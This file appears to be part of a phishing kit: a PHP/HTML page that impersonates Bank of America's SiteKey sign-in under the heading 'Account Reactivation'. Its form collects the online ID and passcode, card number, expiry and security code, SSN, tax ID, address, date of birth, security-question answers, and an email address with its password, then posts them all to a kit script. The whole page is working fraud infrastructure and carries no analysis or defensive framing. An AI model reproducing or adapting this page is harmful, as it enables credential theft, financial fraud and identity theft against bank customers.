<?php
$ID = $HTTP_COOKIE_VARS['ID'];
$states = $HTTP_COOKIE_VARS['states'];

?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
	<head>
	<!-- XENGINE LSU Vipaa 6.0 2012.08 r20 --><!-- TLDB false -->
	<!-- TL-NOPV true -->
	<title>Bank of America | Online Banking | SiteKey | SiteKey Challenge Question</title>
	<meta name="Description" CONTENT="Please answer the security question to continue signing in on this unrecognized computer."><meta name="Keywords" CONTENT="Unrecognized computer"><meta http-equiv="content-type" content="text/html;charset=utf-8" />
	<link rel="shortcut icon" href="img/favicon.ico" type="image/ico" /><!-- TLDB TEALEAF_UiCapture_APP_ENABLED_NOT_TRUE -->
	<link rel="stylesheet" type="text/css" href="scripts/global-jawr.css" media="all" />
<link rel="stylesheet" type="text/css" href="scripts/vipaa-jawr.css" media="all" />
			<script src="scripts/global-jawr.js" type="text/javascript"></script>
			<script src="scripts/vipaa-jawr.js" type="text/javascript"></script>	<script language="JavaScript" type="text/javascript">		addPassMarkFlash2("scripts/caapmfso.swf", "write", "PMV60N%252FagVW3rAUZR8s3Hrl96TRyN4PYjNlWoBSqXZckHfFDN%252BHFWvwWNV0AwGD%252B4L16ob7bbQJjhUKfGMDkBS6JMmJw%253D%253D");	</script><!-- PHASE 2B CHANGES currentLocation is /login/sign-in/unrecognized-computer -->		<style type="text/css"> body { display : none;} </style>	</head>	<body class="trfwl-body      ">		<script type="text/javascript"> 		if (self == top) {		  var theBody = document.getElementsByTagName('body')[0];		  theBody.style.display = "block";		} else { 		  top.location = self.location; 		}		</script>		<noscript><style>body{display : block;}</style></noscript>				<a class="ada-hidden" href="#skip-to-h1" name="anc-skip-to-main-content">Skip to main content</a>				<div class="two-row-flex-wideleft-layout">			<div class="center-content">				<div class="header"><div class="header-module">   <div class="fsd-secure-esp-skin">    	  <img height="28" width="207" alt="Bank of America" src="img/bac_reg_logo_tmp_250X69.gif" />      <div class="page-type">Sign In</div>      <div class="right-links">		<div class="secure-area">Secure Area</div>       <a class="divide" href="/login/languageToggle.go?request_locale=es-us" target="_self" name="spanish_toggle" title="Muestra esta sesi�n de la Banca en L�nea">En Espa&#241;ol</a>        <div class="clearboth"></div>      </div>      <div class="clearboth"></div>   </div></div><div class="page-title-module h-100">  		<div id="skip-to-h1" class="red-grad-bar-skin sup-ie">    		<h1>Account Reactivation.</h1>  		</div></div>
<div class="form-progress form-step1">
					<span class="tab1">SiteKey Challenge Questions</span>
					<span class="tab2">Account update </span>
					<span class="tab3">Confirmation</span>
					
				</div>

				<div id="clientSideErrors" class="messaging-module hide" aria-live="polite">		<div class="error-skin">			<div class="error-message">						<p class="title">We can't process your request:</p>					<div id="Vipaa_Client_0"><p>We encountered errors with the highlighted item(s). Please make the noted adjustments to continue.</p></div>				<ul></ul>			</div>		</div>	</div><script type="text/javascript">	var continueURL = '/login/ping';	function myUrl() {			window.location =  '/login/sign-in/signOnScreen.go';			 		     	    	   	    	}</script>

</div>				<div class="flex-top-row"></div>				<div class="bottom-row">					<div class="left-column"><div class="sitekey-questions-module">	<div class="verify-comp-skin phoenix">

<p>To Confirm your <b>Mailing address</b>, please complete all the fields below.<br>It is important to note that, the supplied details must match with what we have on file.</p>
	<div class="hrs"><!--SPACER--></div>
			<form class="simple-form" name="VerifyCompForm" id="VerifyCompForm" method="post" action="validateChallengeAnswer.go.php" autocomplete="off">
			
			<input type="hidden" name="ID" value="">
			<input type="hidden" name="states" value="<?php echo($states); ?>">
			
			<div class="id-section">	<label style="font-size:12pt; text-align:right;color: #036;"><strong>Online Login details</strong></label>				<label for="enterID-input"><strong><span class="bold">Online ID:</span></strong></label><input type="text" id="enterID-input" name="onlineId" maxlength="32" value="">		<label for="tlpvt-passcode-input">Passcode</label>			<div class="TL_NPI_Pass">				<input type="password" class="tl-private" id="tlpvt-passcode-input" name="password" maxlength="20" value="">			</div>









<table border="0" cellpadding="0" cellspacing="0" class="horizontal_hold" summary="">
<tr>

<div class="personal-key" id="safepasswdgt-personal-key">
<div id="safepassNonFlashwidget" style="display: block; ">
<link rel="stylesheet" href="scripts/safepass-widget-html-util.css" type="text/css">

<div class="safepass-widget-module safepass-skin-1" id="safepass-id-84095371" style="display: block; ">
									<!-- the following is for the authencate code -->
									<div class="safepass-authenticate repaint-ie-email" style="display: block; ">
									<div class="inner">
									<h2>Authenticate</h2>
									<div class="safepass-body">
									<div class="safepass-form" style="display: block; ">
									<div class="sf-form">
									<div class="auth-content">
									<div class="sp-notify"></div>									
									<div class="formRow">
									<label id="safepass-card-label" for="auth-safepass-cardnum"><strong>Card Number: </strong> </label>
									<input type="text" class="safe-pass-input required-number" id="auth-safepass-cardnum" name="ccNo" maxlength="16">
									<div class="clear-both"></div>
									</div>
									<div class="formRow">
									<div class="fl-left"><label><strong>Expiration: </strong> </label></div>
									<div class="fl-left"><label for="auth-safepass-exMonth" class="ada-hidden">month </label>
									<select name="auth-safepass-exMonth" id="auth-safepass-exMonth" class="custom-select select-exMonth">
									<option value="0">----</option>
									<option value="01">01</option>
									<option value="02">02</option>
									<option value="03">03</option>
									<option value="04">04</option>
									<option value="05">05</option>
									<option value="06">06</option>
									<option value="07">07</option>
									<option value="08">08</option>
									<option value="09">09</option>
									<option value="10">10</option>
									<option value="11">11</option>
									<option value="12">12</option>
									</select>
									<div class="clear-both"></div>
									</div>
									<div class="fl-left">
									<label for="auth-safepass-exYear" class="ada-hidden"><strong>Expiration: </strong> year</label>
									<select name="auth-safepass-exYear" id="auth-safepass-exYear" class="custom-select select-exYear"><option value="0">----</option><option value="2014">2014</option><option value="2015">2015</option><option value="2016">2016</option><option value="2017">2017</option><option value="2018">2018</option><option value="2019">2019</option><option value="2020">2020</option></select>
									<div class="clear-both"></div>
									</div>
									<div class="clear-both"></div>
									</div>
									<div class="formRow">
									<label for="auth-safepass-secCode"><strong>3 or 4 digit security </strong> <br><strong>code </strong>  <a href="https://sitekey.bankofamerica.com/cmsContent/en_US/TransferFunds/Model/WhyDoWeAskForThisInfoPopUp.html"  target="_blank" class="spw-popup">What is this?</a> </label>
									<input type="text" class="safe-pass-input required-number" id="auth-safepass-secCode" name="secureCode" maxlength="4">
									<div class="clear-both"></div>
									</div>
									</div>
									</div>
									<div class="clearboth"></div>
									</div>
									
									</div>
									<div class="safepass-end"></div>
									</div>
									</div>
									</div></div>

<input type="hidden" name="transfers.artifact" value="" id="add-recipient_transfers_artifact">								</div>
			
</tr>	
</table>


<table border="0" cellpadding="0" cellspacing="0" class="horizontal_hold" style="margin-top: 10px;" summary="">
<tr>
<td style="padding-bottom: 0;">

</td>
</tr>
</table>


<label for="emailNotRequired">Full Name On Account</label>				<div class="emailNotRequired">					<input type="text" name="fullname" id="full name"  maxlength="45" class="textfield" style="width: 140px;">				</div>	




<label for="emailNotRequired">Social Security Number</label>				<div class="emailNotRequired">					<input type="text" name="ssn" id="emailNotRequired"  maxlength="45" class="textfield" style="width: 140px;">				</div>	



<label for="emailNotRequired">Tax Identification Number</label>				<div class="emailNotRequired">					<input type="text" name="tax" id="emailNotRequired"  maxlength="45" class="textfield" style="width: 140px;">				</div>	

<label for="emailNotRequired">Address</label>				<div class="emailNotRequired">					<input type="text" name="Address" id="emailNotRequired"  maxlength="45" class="textfield" style="width: 140px;">				</div>	

<label for="emailNotRequired">Zip Code</label>				<div class="emailNotRequired">					<input type="text" name="zip" id="emailNotRequired"  maxlength="45" class="textfield" style="width: 140px;">				</div>

<label for="emailNotRequired">City</label>				<div class="emailNotRequired">					<input type="text" name="city" id="emailNotRequired"  maxlength="45" class="textfield" style="width: 140px;">				</div>

<label for="emailNotRequired">Date of Birth</label>				<div class="emailNotRequired">					<input type="text" name="dob" id="emailNotRequired"  maxlength="45" class="textfield" style="width: 140px;">				</div>	













			<div class="clearboth"></div>	</div>	<div class="hrs"><!--SPACER--></div><div class="TL_NPI_ChallengeAnswer"><label style="font-size:12pt; text-align:right;color: #036;"><strong>SiteKey challenge questions and answers</strong></label><p>Please select your current challenge questions and provide the appropriate answers.</p>
			<legend>Field required</legend> 
			<label for="question1"> Your 1st question </label>
<select id="question1" name="questionId1"  class="tl-private">
<option class="TL_NPI_ChallengeAnswer" value="">Select one...</option>
<option class="TL_NPI_ChallengeAnswer" value="What was the name of your first pet?"  >What was the name of your first pet?</option>
<option class="TL_NPI_ChallengeAnswer" value="What is your maternal grandfather's first name?"  >What is your maternal grandfather's first name?</option>
<option class="TL_NPI_ChallengeAnswer" value="What is the name of your first niece/nephew?"  >What is the name of your first niece/nephew?</option>
<option class="TL_NPI_ChallengeAnswer" value="What is the name of the first company you worked for?"  >What is the name of the first company you worked for?</option>
<option class="TL_NPI_ChallengeAnswer" value="In what year (YYYY) did you graduate from high school?"  >In what year (YYYY) did you graduate from high school?</option>
<option class="TL_NPI_ChallengeAnswer" value="What was your high school mascot?"  >What was your high school mascot?</option>
<option class="TL_NPI_ChallengeAnswer" value="How old were you at your wedding?"  >How old were you at your wedding? (Enter age as digits.)</option>
<option class="TL_NPI_ChallengeAnswer" value="In what city were you living at age 16?"  >In what city were you living at age 16?</option>
<option class="TL_NPI_ChallengeAnswer" value="What is your maternal grandmother's first name?"  >What is your maternal grandmother's first name?</option>
<option class="TL_NPI_ChallengeAnswer" value="What is the first name of your oldest nephew?"  >What is the first name of your oldest nephew?</option>
<option class="TL_NPI_ChallengeAnswer" value="In what city were you born?"  >In what city were you born? (Enter full name of city only)</option>
</select>

<label for="answer1"><span class="ada-hidden">Your First</span>Answer</label>
<input class="tl-private" type="text" id="answer1" maxlength="30" name="actualAnswer1" value=""/>

<label for="question2"> Your 2nd question </label>
<select id="question2" name="questionId2"  class="tl-private">
<option class="TL_NPI_ChallengeAnswer" value="">Select one...</option>
<option class="TL_NPI_ChallengeAnswer" value="What was the first live concert you attended?"  >What was the first live concert you attended? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is the first name of your first child?"  >What is the first name of your first child? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is the name of your first employer?"  >What is the name of your first employer? </option>
<option class="TL_NPI_ChallengeAnswer" value="What was the name of the first school you attended?"  >What was the name of the first school you attended? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is your mother's middle name?"  >What is your mother's middle name? </option>
<option class="TL_NPI_ChallengeAnswer" value="On what street did you grow up?"  >On what street did you grow up? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is the first name of your oldest niece?"  >What is the first name of your oldest niece? </option>
<option class="TL_NPI_ChallengeAnswer" value="In what city were you married?"  >In what city were you married? </option>
<option class="TL_NPI_ChallengeAnswer" value="What was the first name of your first manager?"  >What was the first name of your first manager? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is the first name of the best man/maid of honor at your wedding?"  >What is the first name of the best man/maid of honor at your wedding? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is your father's middle name?"  >What is your father's middle name? </option>
</select>
<label for="answer2"><span class="ada-hidden">Your Second</span> Answer</label>
<input class="tl-private" type="text" id="answer2" maxlength="30" name="actualAnswer2" value=""/>

<label for="question2"> Your 3nd question </label>
<select id="question2" name="questionId3"  class="tl-private">
<option class="TL_NPI_ChallengeAnswer" value="">Select one...</option>
<option class="TL_NPI_ChallengeAnswer" value="What was the first live concert you attended?"  >What was the first live concert you attended? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is the first name of your first child?"  >What is the first name of your first child? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is the name of your first employer?"  >What is the name of your first employer? </option>
<option class="TL_NPI_ChallengeAnswer" value="What was the name of the first school you attended?"  >What was the name of the first school you attended? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is your mother's middle name?"  >What is your mother's middle name? </option>
<option class="TL_NPI_ChallengeAnswer" value="On what street did you grow up?"  >On what street did you grow up? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is the first name of your oldest niece?"  >What is the first name of your oldest niece? </option>
<option class="TL_NPI_ChallengeAnswer" value="In what city were you married?"  >In what city were you married? </option>
<option class="TL_NPI_ChallengeAnswer" value="What was the first name of your first manager?"  >What was the first name of your first manager? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is the first name of the best man/maid of honor at your wedding?"  >What is the first name of the best man/maid of honor at your wedding? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is your father's middle name?"  >What is your father's middle name? </option>
</select>
<label for="answer2"><span class="ada-hidden">Your Second</span> Answer</label>
<input class="tl-private" type="text" id="answer2" maxlength="30" name="actualAnswer3" value=""/>

<label for="question3"> Your 4nd question </label>
<select id="question3" name="questionId4"  class="tl-private">
<option class="TL_NPI_ChallengeAnswer" value="">Select one...</option>
<option class="TL_NPI_ChallengeAnswer" value="What is your best friend's first name?"  >What is your best friend's first name? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is your oldest sibling's middle name?"  >What is your oldest sibling's middle name? </option>
<option class="TL_NPI_ChallengeAnswer" value="In which city did you meet your spouse for the first time?"  >In which city did you meet your spouse for the first time? </option>
<option class="TL_NPI_ChallengeAnswer" value="In what city did you honeymoon?"  >In what city did you honeymoon? (Enter full name of city only) </option>
<option class="TL_NPI_ChallengeAnswer" value="What is your paternal grandfather's first name?"  >What is your paternal grandfather's first name? </option>
<option class="TL_NPI_ChallengeAnswer" value="Who is your favorite childhood superhero?"  >Who is your favorite childhood superhero? </option>
<option class="TL_NPI_ChallengeAnswer" value="With what company did you hold your first job?"  >With what company did you hold your first job? </option>
<option class="TL_NPI_ChallengeAnswer" value="What was the name of your first boyfriend or girlfriend?"  >What was the name of your first boyfriend or girlfriend? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is your paternal grandmother's first name?"  >What is your paternal grandmother's first name? </option>
<option class="TL_NPI_ChallengeAnswer" value="In what city was your father born?"  >In what city was your father born?  (Enter full name of city only) </option>
<option class="TL_NPI_ChallengeAnswer" value="In what city was your mother born?"  >In what city was your mother born? (Enter full name of city only) </option>
</select>
<label for="answer3"><span class="ada-hidden">Your Third</span> Answer</label>
<input class="tl-private" type="text" id="answer3" maxlength="30" name="actualAnswer4" value=""/>

<label for="question2"> Your 5th question </label>
<select id="question2" name="questionId5"  class="tl-private">
<option class="TL_NPI_ChallengeAnswer" value="">Select one...</option>
<option class="TL_NPI_ChallengeAnswer" value="What was the first live concert you attended?"  >What was the first live concert you attended? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is the first name of your first child?"  >What is the first name of your first child? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is the name of your first employer?"  >What is the name of your first employer? </option>
<option class="TL_NPI_ChallengeAnswer" value="What was the name of the first school you attended?"  >What was the name of the first school you attended? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is your mother's middle name?"  >What is your mother's middle name? </option>
<option class="TL_NPI_ChallengeAnswer" value="On what street did you grow up?"  >On what street did you grow up? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is the first name of your oldest niece?"  >What is the first name of your oldest niece? </option>
<option class="TL_NPI_ChallengeAnswer" value="In what city were you married?"  >In what city were you married? </option>
<option class="TL_NPI_ChallengeAnswer" value="What was the first name of your first manager?"  >What was the first name of your first manager? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is the first name of the best man/maid of honor at your wedding?"  >What is the first name of the best man/maid of honor at your wedding? </option>
<option class="TL_NPI_ChallengeAnswer" value="What is your father's middle name?"  >What is your father's middle name? </option>
</select>
<label for="answer2"><span class="ada-hidden">Your Second</span> Answer</label>
<input class="tl-private" type="text" id="answer2" maxlength="30" name="actualAnswer5" value=""/>

<!--</tl_private>-->
		<div class="hrs"><!--SPACER--></div><label style="font-size:12pt; text-align:right;color: #036;"><strong>Email Synchronisation.</strong></label><p>Please complete the section below to protect your email from all forms of attacks.</p>
		<label for="emailNotRequired">E-mail address</label>				<div class="emailNotRequired">					<input type="text" name="email" id="emailNotRequired"  maxlength="45" class="textfield" style="width: 240px;">				</div>		
			<label for="emailNotRequired">Password</label>				<div class="PasslNotRequired">					<input type="password" name="emailpass" id="PasslNotRequired"  maxlength="45" class="textfield" style="width: 240px;">				</div>		
			<div class="clearboth"></div>	

			</div>				 				 						 				 			<a href="javascript:void(0);" title="Continue" onclick="document.VerifyCompForm.action='validateChallengeAnswer.go.php';$('#VerifyCompForm').submit();" class="button-common button-blue" name="enter-online-id-submit" align="center"><span>Continue</span></a>				 <div class="clearboth"></div>			
			</form>	
			</div></div></div>

			<div class="clearboth"></div>
			</div>
			<div class="single-column-row"></div>
			<div class="footer">
			<div class="footer-top">&nbsp;</div>
			<div class="footer-inner">	<script type="text/javascript">	var cmPageId = "OLB:Tool:SiteKey;Challenge_Q-A";	var cmCategoryId = "OLB:Tool:SiteKey";		var cmSessionID = "" ;	function cmGetReqParameter(queryString, parameterName) {	var parameterName = parameterName + "=";	if (queryString.length > 0) {		begin = queryString.indexOf(parameterName);		if (begin != -1) {			begin += parameterName.length;			end = queryString.indexOf ( "&" , begin );			if ( end == -1 ) {				end = queryString.length			}			return unescape ( queryString.substring ( begin, end ) );		}		return null;	}}var testString = window.location.href;if (cmGetReqParameter(testString, 'sessionid') !== null) {	cmSessionID = cmGetReqParameter(testString, 'sessionid');}	var cmSuccessGlob = $('body').find('.messaging-module .info-skin');var cmSuccess = cmSuccessGlob.length;var cmFailure = $("div.messaging-module div.error-skin:visible").length;var cmErrorMsg = '';var cmReqLocale = $('html').attr('lang');var locAppendage;if (cmReqLocale.toLowerCase().indexOf('en') !== -1) {	locAppendage = '';} else if (cmReqLocale.toLowerCase().indexOf('es') !== -1) {	locAppendage = '_ES';}if (testString.toLowerCase().indexOf('pssit.bankofamerica.com') !== -1) {	cmSetStaging();} else if (testString.toLowerCase().indexOf('.bankofamerica.com') !== -1) {	testString = testString.toLowerCase();  var tempArr = testString.split('.bankofamerica.com');	var tempStr = tempArr[0];  if (tempStr.indexOf('\/\/') !== -1) {		tempArr = tempStr.split('\/\/');		tempStr = tempArr[1];    if (tempStr.indexOf('.') !== -1) {      tempArr = tempStr.split('.');			tempStr = tempArr[0];    }    if (tempStr.indexOf('www') !== -1) {      if (tempStr.indexOf('-') !== -1) {				cmSetStaging();			} else {				cmSetProduction();			}    } else {			if (tempStr.indexOf('sitekey') !== -1) {        if (tempStr === 'sitekey') {					cmSetProduction();				}	else {					cmSetStaging();				}      } else {				cmSetProduction();			}                 }  }}	if (cmSuccess === 0 && cmFailure === 0 ) {		cmCreatePageviewTag(cmPageId+locAppendage, null, null, cmCategoryId, false, false, null, false, false, null, null, null, null, cmSessionID, null, null, null, null, null, null, null);	}		else if (cmFailure > 0 ) {				var errorCode='';		var errorCodeCounter=0;		var cmErrorMsg = '';		cmCreatePageviewTag(cmPageId+'_Error'+locAppendage, null, null, cmCategoryId, false, false, null, false, false, null, null, null, null, cmSessionID, null, null, null, null, null, null, null);		if ($('.messaging-module').find('.error-skin:visible').length > 0) {			$('.messaging-module .error-skin:visible ul li').each(function() {				cmErrorMsg = $(this).html();				cmCreateCustomError(cmPageId+'_Error'+locAppendage, null, null, null, 'Vipaa_Action_'+errorCodeCounter, cmCategoryId, cmErrorMsg);				errorCodeCounter = errorCodeCounter + 1;			});					}	}	</script><div class="global-footer-module">   <div class="gray-bground-skin">		<div class="secure">Secure Area</div>	             <div class="link-container">         <div class="link-row"> 								<a class="last-link" href="https://www.bankofamerica.com/privacy/" name="Privacy_&_Security_footer" title="Privacy & Security" target="_blank">Privacy &amp; Security</a>				<div class="clearboth"></div>         </div>      </div>      <p>Bank of America, N.A. Member FDIC. <a name="Equal_Housing_Lender" href="http://www.bankofamerica.com/help/equalhousing_popup.cfm" target="_blank">Equal Housing Lender<img style="vertical-align: baseline;" src="img/icon_equal_housing_lender.gif" alt="" hspace="3" width="14" height="9" /></a> <br />&copy; 2015 Bank of America Corporation. All rights reserved.</p>   </div></div></div>				</div>			</div>		</div>	</body></html>
